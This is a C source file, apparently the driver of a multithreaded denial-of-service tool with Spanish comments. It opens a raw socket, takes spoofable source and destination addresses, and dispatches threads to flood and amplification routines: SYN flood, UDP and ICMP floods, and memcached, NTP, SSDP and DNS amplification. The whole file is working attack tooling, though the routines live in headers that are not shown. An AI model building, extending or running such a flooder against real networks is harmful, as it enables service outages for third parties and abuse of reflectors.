#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ether.h>
#include <linux/if_packet.h>
#include <unistd.h>
#include <pthread.h>
#include "./includes/udp.h"
#include "./includes/tcp.h"
#include "./includes/icmp.h"

typedef struct {
    char *protocolo;
	char *destino;
	char *puerto;
	char *source;
	char *mask;
	int sockfd;
} threadArgs;

void* atacator(void* args);

int main(int argc, char *argv[]){

	char *ip_addr, *subnet_mask, *protocolo, *puerto, *destino;
    int j, num_threads;

	// Recibimos los argumentos por linea de comandos
    for (j = 1; j < argc; j+=2) {
        if (strcmp(argv[j], "-src") == 0) {
			if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					ip_addr = argv[j + 1];
				} else {
					printf("Error: -src necesita un argumento.\n");
				}
            } else {
                printf("Error: -src necesita un argumento.\n");
                return 1;
            }
        } else if (strcmp(argv[j], "-m") == 0) {
            if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					subnet_mask = argv[j + 1];
				} else {
					printf("Error: -m necesita un argumento.\n");
				}
            } else {
                printf("Error: -m necesita un argumento.\n");
                return 1;
            }
        } else if (strcmp(argv[j], "-a") == 0) {
            if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					protocolo = argv[j + 1];
				} else {
					printf("Error: -a necesita un argumento.\n");
				}
            } else {
                printf("Error: -a necesita un argumento.\n");
                return 1;
            }
        } else if (strcmp(argv[j], "-p") == 0) {
            if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					puerto = argv[j + 1];
				} else {
					printf("Error: -p necesita un argumento.\n");
				}
            } else {
                printf("Error: -p necesita un argumento.\n");
                return 1;
            }
        } else if (strcmp(argv[j], "-dst") == 0) {
            if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					destino = argv[j + 1];
				} else {
					printf("Error: -dst necesita un argumento.\n");
				}
            } else {
                printf("Error: -dst necesita un argumento.\n");
                return 1;
            }
        } else if (strcmp(argv[j], "-t") == 0) {
            if (j + 1 < argc) {
				if(strncmp(argv[j+1], "-", 1)){
					num_threads = atoi(argv[j + 1]);
					if (num_threads <= 0) {
						fprintf(stderr, "Numero invalido de threads\n");
						return 1;
					}
				} else {
					printf("Error: -t necesita un argumento.\n");
				}
            } else {
                printf("Error: -t necesita un argumento.\n");
                return 1;
            }
        } else {
            fprintf(stderr, "Packet generator usage: sudo %s -dst <dest_addr> -src <src_addr> -m <subnet_mask> -p <dest_port> -a <ataque> -t <number of threads>\n", argv[0]);
        	return 1;
        }
    }

	// Creamos un socket RAW donde indicamos con el flag IPPROTO_RAW que el paquete que enviamos
	// contiene el header ip y el header del protocolo correspondiente
	int sockfd = 0;
	sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);

	// Comprobamos que el socket se ha creado con exito
    if(sockfd == -1){
        perror("Ha habido un problema al crear el socket");
        exit(1);
    }


	pthread_t* threads = malloc(sizeof(pthread_t) * num_threads);
    threadArgs* thread_args = malloc(sizeof (threadArgs));
	thread_args->protocolo = protocolo;
	thread_args->destino = destino;
	thread_args->source = ip_addr;
	thread_args->puerto = puerto;
	thread_args->sockfd = sockfd;
	thread_args->mask = subnet_mask;
    int i;

	for (i = 0; i < num_threads; ++i) {
        if (pthread_create(&threads[i], NULL, atacator, (void*)thread_args)) {
            fprintf(stderr, "Error creando el thread %d\n", i);
            exit(1);
        }
	}

	for (i = 0; i < num_threads; ++i) {
        if (pthread_join(threads[i], NULL)) {
            fprintf(stderr, "Error uniendo al thread %d\n", i);
            exit(1);
        }
    }
}

void* atacator(void* argumentos)
{
	threadArgs* args = (threadArgs*) argumentos;
	// Comprobamos el protocolo/ataque proporcionado por linea de comandos
	if(strcmp(args->protocolo, "udp") == 0){
		udp(args->sockfd, args->destino, args->source, atoi(args->puerto));
	} else if((strcmp(args->protocolo, "tcp") == 0)){
		tcp(args->sockfd, args->destino, args->source, atoi(args->puerto));
	} else if((strcmp(args->protocolo, "syn_flood") == 0)){
		syn_flood(args->sockfd, args->destino, args->source,atoi(args->puerto));
	} else if((strcmp(args->protocolo, "memcached") == 0)){
		memcached(args->sockfd, args->source);
	} else if((strcmp(args->protocolo, "ntp_amp") == 0)){
		ntp_amp(args->sockfd, args->source);
	} else if((strcmp(args->protocolo, "ssdp") == 0)){
		ssdp(args->sockfd, args->source);
	} else if((strcmp(args->protocolo, "dns_amp") == 0)){
		dns_amp(args->sockfd, args->destino, args->source, atoi(args->puerto));
	} else if((strcmp(args->protocolo, "udp_flood") == 0)){
		udp_flood(args->sockfd, args->source, args->destino, atoi(args->puerto), "You are being flooded");
	} else if((strcmp(args->protocolo, "icmp_flood") == 0)){
		icmp_flood(args->sockfd, args->source, args->destino, atoi(args->puerto));
	}
  	pthread_exit(NULL);
}